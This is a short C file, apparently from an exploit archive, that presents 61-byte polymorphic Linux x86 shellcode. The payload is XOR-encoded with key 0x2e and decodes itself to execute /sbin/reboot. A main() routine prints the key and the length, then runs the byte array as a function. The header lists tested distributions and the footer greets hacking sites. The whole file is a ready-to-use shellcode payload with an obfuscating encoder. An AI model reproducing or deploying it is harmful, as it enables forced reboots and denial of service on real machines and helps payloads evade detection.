/*
 * sys_execve("/sbin/reboot", { "/sbin/reboot", NULL }, NULL) 61 bytes polymorphic shellcode
 *
 * tesla_ (gandung@ppp.cylab.cmu.edu)
 */

/*
 * Tested in : 
 * - BackTrack 5 (linux-2.6.38-generic)
 * - Ubuntu 10.10 Maverick Meerkat (linux-2.6.38-generic)
 * - Ubuntu 11.04 Natty Narwhal
 * - Debian Squeeze 6.0.2 (linux-2.6.32-5-stable)
 */

#include <stdio.h>
#include <string.h>

char encoded_reboot[] = "\xeb\x0d\x5e\x31\xc9\xb1\x29\x80\x36\x2e"
			"\x46\xe2\xfa\xeb\x05\xe8\xee\xff\xff\xff"
			"\x1f\xee\xad\xc2\x2f\xa6\x2a\x0a\x46\x4c"
			"\x41\x41\x5a\x46\x40\x01\x5c\x4b\x46\x01"
			"\x5d\x4c\x47\xa7\xcd\x7e\x7d\x9e\x25\xa7"
			"\xcf\x1f\xfc\xe3\xae\x1f\xee\x9e\x2f\xe3"
			"\xae";

int main(void) {
  int encoded_reboot_len = strlen(encoded_reboot);
  printf("[+] Using mutation key engine : 0x2e\n");
  printf("[+] Length of this shellcode : %d bytes\n\n", encoded_reboot_len);
  (*(void(*)())encoded_reboot)();
  return 0;
}

/* devilzc0de.org, hacker-newbie.org, sdf.lonestar.org, 1337day.com */